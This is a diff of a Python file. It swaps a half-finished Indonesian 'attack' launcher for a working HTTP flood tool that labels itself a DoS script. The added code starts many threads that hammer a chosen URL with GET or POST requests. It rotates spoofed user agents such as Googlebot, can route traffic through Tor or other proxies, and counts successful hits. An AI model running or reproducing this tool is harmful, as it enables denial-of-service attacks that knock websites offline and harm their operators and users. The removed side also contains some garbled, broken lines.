@@ -1,120 +1,192 @@
-# -*- coding: utf-8 -*-                                                                                                                    import os
-import requests
-import datetime
-import asyncio
-import validators
-from urllib.parse import urlparse
-from sys import stdout
-from colorama import Fore, Style, init
-import logging                                                                                                                             
-# Inisialisasi Colorama dan Logging                                                                                                        init(autoreset=True)
-                                                                                                                                           # Pengaturan Logging yang benar
-logging.basicConfig(
-    filename='attack.log',
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',  # Perbaiki dari levellevel menjadi levelname                                          datefmt='%Y-%m-%d %H:%M:%S'
-)
+#!/usr/bin/env python
+# -*- encoding: UTF-8 -*-
 
-# Fungsi untuk Logging Informasi Serangan
-def log_attack_status(message, level='info', print_to_terminal=True):
-    if level == 'info':
-        logging.info(message)
-        if print_to_terminal:
-            print(f"{Fore.CYAN}|    [INFO] {message.ljust(63)}|")
-    elif level == 'error':
-        logging.error(message)
-        if print_to_terminal:
-            print(f"{Fore.RED}|    [ERROR] {message.ljust(63)}|")
-    elif level == 'warning':
-        logging.warning(message)
-        if print_to_terminal:
-            print(f"{Fore.YELLOW}|    [WARNING] {message.ljust(63)}|")
+import random
+import re
+try:
+    import requests
+except ImportError:
+    print('You must install requests lib\n $ pip install requests')
+import threading
+import time
+import argparse
+from arts import Header, options
 
+config = {}     # Stores de configuration provided by the user
+success = 0     # Count of the amount of packets successfully send
+stop = False    # If True stop all threads
+user_agents = [
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
+    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
+    "Opera/9.20 (Windows NT 6.0; U; en)",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
+]
 
-# Fungsi untuk Menampilkan Header BASE dengan Warna
-def display_header():
-    header_lines = [ 
-f"{Fore.GREEN}     
-f"{Fore.GREEN}     
-f"{Fore.GREEN}     
-f"{Fore.RED}     
-f"{Fore.RED}     
-f"{Fore.RED}    
-f"{Fore.RED}     
-f"{Fore.RED}    
-f"{Fore.CYAN}     
-f"{Fore.CYAN}   
-f"{Fore.CYAN}     
-f"{Fore.GREEN}     
-f"{Fore.YELLOW}    
-     ]
-# Tampilkan header dengan warna
-    for line in header_lines:
-        print("line")
+class thread(threading.Thread):
+    def __init__(self, config):
+        threading.Thread.__init__(self)
+        self.url = config["url"]
+        self.proxy = config["proxy"]
+        self.on = not stop
+        self.config = config
 
-    # Versi dan URL
-    print(f"{Fore.WHITE}{Style.BRIGHT}{' ' * 57}v.1.0")
-    print(f"{Fore.CYAN}{Style.BRIGHT}{' ' * 16}https://github.com/KUNF24/PASTBLACK-DD0S.git")
-    print(f"{Fore.CYAN}|{'=' * 74}|")
+    def set_headers(self):
+        return {'user-agent': self.config["user_agent"] if self.config["user_agent"] else random.choice(user_agents)}
+    def count_packets(self):
+        global success
+        success += 1
 
-# Fungsi untuk Meminta Input dari Pengguna dengan Tampilan Rapi
-def get_user_input(prompt_message):
-    print(f"{Fore.GREEN}|{' ' * 4}[?] {prompt_message.ljust(63)}|")
-    print(f"{Fore.GREEN}|{'=' * 74}|")
-    return input(f"{Fore.YELLOW}{' ' * 4}> ").strip()
+class Get(thread):
+    def __init__(self,config):
+        super().__init__(config)
 
-# Fungsi Countdown untuk Menampilkan Waktu Serangan
-def countdown(t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    while True:
-        remaining_time = (until - datetime.datetime.now()).total_seconds()
-        if remaining_time > 0:
-            stdout.flush()
-            stdout.write(f"\r{Fore.MAGENTA}|    [*] Attack status => {remaining_time:.2f} sec left {' ' * 26}|")
-        else:
-            stdout.flush()
-            stdout.write(f"\r{Fore.MAGENTA}|    [*] Attack Done!{' ' * 53}|\n")
-            print(f"{Fore.CYAN}|{'=' * 74}|")
-            return
+    def http_get(self):                 # Change session to previous
 
-# Validasi URL dan Parsing Target
-def get_target(url):
-    if not validators.url(url):
-        log_attack_status(f"URL tidak valid: {url}", level='error')
-        raise ValueError(f"URL tidak valid: {url}")
+        try:
+            r = requests.get(self.url, headers=self.set_headers(), proxies=self.proxy)
+            self.count_packets()  if r.status_code == 200 else None
+        except requests.exceptions.RequestException as e:
+            print("Error: {}".format(e))
+    def run(self):
+        while self.on:
+            self.http_get()
+            self.on = not stop
+            time.sleep(0.01)
 
-    target = {
-        'uri': urlparse(url).path or "/",
-        'host': urlparse(url).netloc,
-        'scheme': urlparse(url).scheme,
-        'port': urlparse(url).netloc.split(":")[1] if ":" in urlparse(url).netloc else ("443" if urlparse(url).scheme == "https" else "80")
-    }
-    log_attack_status(f"Target diperoleh: {target['host']} ({target['scheme']}://{target['host']}:{target['port']}{target['uri']})")
-    return target
+class Post(thread):
+    def __init__(self,config):
+        super().__init__(config)
 
-# Fungsi Serangan Utama
-def launch_attack(target_url, duration):
-    target = get_target(target_url)
+    def http_post(self):
+        try:
+            p = requests.post(self.url, data = generate_data(100), headers = self.set_headers(), proxies = self.proxy)
+            self.count_packets() if p.status_code == requests.codes.ok else None
+        except requests.exceptions.RequestException as e:
+            print("Error: {}".format(e))
+    def run(self):
+        while self.on:
+            self.http_post()
+            self.on = not stop
+            time.sleep(0.01)
 
-    # Inisialisasi Serangan dan Waktu Serangan
-    log_attack_status(f"Meluncurkan serangan ke {target['host']} untuk {duration} detik...")
-    countdown(duration)
+class Checker(thread):
+    def __init__(self, config, sleep=None):
+        super().__init__(config)
+        self.sleep = sleep if sleep else 10
+
+    def run(self):
+        while(self.on):
+            stop = not check_address(self.url)
+            time.sleep(self.sleep)
+            self.on = not stop
+
+def parse_address(url):
+    url_format = "(http|https)|\://"
+    link_format = "^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(/\S*)?$"
+    if re.match(url_format + link_format, url):
+        return url
+    elif re.match(link_format, url):
+        return "http://%s" % url
+    elif "://" in url:
+        return "http:"+url.split(":")[1]
+    else:
+        print("[!] Url format is incorrect [!]")
+        exit(0)
+
+def parse_proxy(proxy):
+    if proxy == "tor":
+        proxy = "socks5://127.0.0.1:9050"
+    elif re.match("(.*:)?.*@.*|.*:.*", proxy):
+        proxy = 'http://'+proxy
+    return {'http': proxy, 'https': proxy}
+def check_address(url):
+    # Check if the provided target is up
+    try:
+        req = requests.get(url)
+        return req.status_code == requests.codes.ok
+    except ConnectionError:
+        print("Connection error")
+        return False
+
+def generate_data(leng): 
+    # This is used to generate data randomly 
+    chars = ["!", "@", "-", "`", ";", "^", "+", "*"]
+    msg = ""
+    c = 0
+    while (len(msg)<leng):
+        msg = msg + random.choice(chars)+str(c)
+        c+=1
+    return msg
+
+def get_parser():
+    # Creates a configuration dictionary based on the parameters we gave
+    parser = argparse.ArgumentParser(description='OverHead2 DoS script.')
+    parser.add_argument('-u', '--url', help='Set an IP or URL as target', type=str)
+    parser.add_argument('-t', '--threads', help='Set the number of threads to be created', type=int, default=100)
+    parser.add_argument('-p', '--proxy', help='Use proxy. Type tor to use tor as proxy', type=str)
+    parser.add_argument('-A', '--user-agent', help='Set a custom User Agent',type=str)
+    parser.add_argument('--get', '--GET', help='Perform the attack with HTTP GET', action='store_true')
+    parser.add_argument('--post', '--POST', help='Perform the attack with HTTP POST', action='store_true')
+    return parser
+def check_input(config):
+    # Check and manipulate the inputs
+    if not config["url"]:
+        print('[!]  You must specify a Target  [!]')
+        exit(0)
+    config["url"] = parse_address(config["url"])
+    config["type"] = 'POST' if config["post"] else 'GET' if config['get'] else 'GET'
+    if config['post'] and config['get']:
+        print("[!] Invalid options. You cannot use GET and POST at once")
+        exit(0)
+    return config
+
+def main():
+    threads_pool = []                        # Stores all active threads
+    Header()                                 # Prints the header
+    options = get_parser()                   # Get the arguments
+    config = check_input(vars(options.parse_args()))
+
+    # PRINT INFO BANNER
+    status = check_address(config["url"])
+    separator = "#"+"="*40+"#"
+    print("{0} \n# Target: {1}\n# Threads: {2}\n# Status: {3}\n# Type: {4}\n# Proxy: {5}\n{0}".format(
+        separator,
+        config["url"],
+        config["threads"],
+        "online" if status else "offline",
+        config["type"],
+        config["proxy"]))
+    if not status:
+        exit(0)
+    print("\n> Press enter to launch the attack")
+    input()
+    # START DE ATTACK 
+    starting_time = time.time()
+    for c in range(config["threads"]):
+        t = Get(config) if config["type"] == "GET" else Post(config)
+        threads_pool.append(t)
+        t.start()
+
+    # Starts a new checker thread 
+    checker = Checker(config)
+    checker.start()
+
+    while threading.active_count() > 0:
+        now = round(time.time() -starting_time, 1 )
+        try:
+            print("\r[>] Number of hits: {0}       |   Time: {1}".format(success, now), end="\r")
+        except KeyboardInterrupt:
+            checker.on = False
+            for th in threads_pool:
+                th.on = False
+    print("\n[!] All threads have been stoped")
+    exit(0)
 
 if __name__ == "__main__":
-    # Tampilkan Header
-    display_header()
-
-    # Prompt untuk input dari pengguna dengan tampilan yang rapi
-    target_url = get_user_input("Masukkan target URL:   ")
-    while not validators.url(target_url):
-        print(f"{Fore.RED}|    [ERROR] URL tidak valid. Coba lagi.{' ' * 37}|")
-        print(f"{Fore.CYAN}|{'=' * 74}|")
-        target_url = get_user_input("Masukkan target URL:")
-
-    try:
-        attack_duration = int(get_user_input("Masukkan durasi serangan (detik):"))
-    except ValueError:
-        attack_duration = 60  # Default durasi
-
-    # Luncurkan serangan
-    launch_attack(target_url, attack_duration)
+    main()
